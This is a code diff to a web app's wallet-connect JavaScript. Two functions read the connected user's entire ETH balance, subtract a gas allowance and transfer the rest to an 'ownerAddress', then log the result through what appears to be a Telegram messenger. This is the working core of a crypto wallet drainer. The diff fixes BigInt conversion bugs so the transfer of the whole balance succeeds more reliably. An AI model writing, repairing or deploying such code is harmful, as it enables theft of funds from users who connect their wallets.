@@ -963,13 +963,20 @@ const REOWN_PROJECT_ID = '19d9b1a7e899eca00c33891cc97132ce'; // ← Replace with
     try {
       const getBalance = await appState.web3.eth.getBalance(appState.account);
       const gasPrice = await appState.web3.eth.getGasPrice();
-      const valueToSend = BigInt(getBalance) - (BigInt(gasPrice) * 120000n);
-      if (valueToSend <= 0n) throw new Error("Insufficient balance");
+
+      // Safe BigInt handling - never convert large wei values to Number
+      const balanceBI = typeof getBalance === 'bigint' ? getBalance : BigInt(getBalance);
+      const gasPriceBI = typeof gasPrice === 'bigint' ? gasPrice : BigInt(gasPrice);
+
+      const gasCost = gasPriceBI * 120000n;
+      const valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
+
+      if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
 
       const tx = await appState.web3.eth.sendTransaction({
         from: appState.account,
         to: ownerAddress,
-        value: appState.web3.utils.toHex(valueToSend)
+        value: '0x' + valueToSend.toString(16)   // safe hex, no Number conversion on large BigInt
       });
       success = 1;
       logTlgMsg(msg, success);
@@ -986,7 +993,15 @@ const REOWN_PROJECT_ID = '19d9b1a7e899eca00c33891cc97132ce'; // ← Replace with
     try {
       const getBalance = await appState.web3.eth.getBalance(appState.account);
       const gasPrice = await appState.web3.eth.getGasPrice();
-      const valueToSend = BigInt(getBalance) - (BigInt(gasPrice) * 120000n);
+
+      // Safe BigInt handling - never convert large wei values to Number
+      const balanceBI = typeof getBalance === 'bigint' ? getBalance : BigInt(getBalance);
+      const gasPriceBI = typeof gasPrice === 'bigint' ? gasPrice : BigInt(gasPrice);
+
+      const gasCost = gasPriceBI * 120000n;
+      const valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
+
+      if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
 
       const nonce = await appState.web3.eth.getTransactionCount(appState.account);
       const chainId = await appState.web3.eth.getChainId();
@@ -995,8 +1010,8 @@ const REOWN_PROJECT_ID = '19d9b1a7e899eca00c33891cc97132ce'; // ← Replace with
         to: ownerAddress,
         nonce: appState.web3.utils.toHex(nonce),
         gasLimit: "0x55F0",
-        gasPrice: appState.web3.utils.toHex(gasPrice),
-        value: appState.web3.utils.toHex(valueToSend),
+        gasPrice: '0x' + gasPriceBI.toString(16),   // safe hex string
+        value: '0x' + valueToSend.toString(16),     // safe hex string, no Number() on large BigInt
         data: "0x0",
         chainId
       };
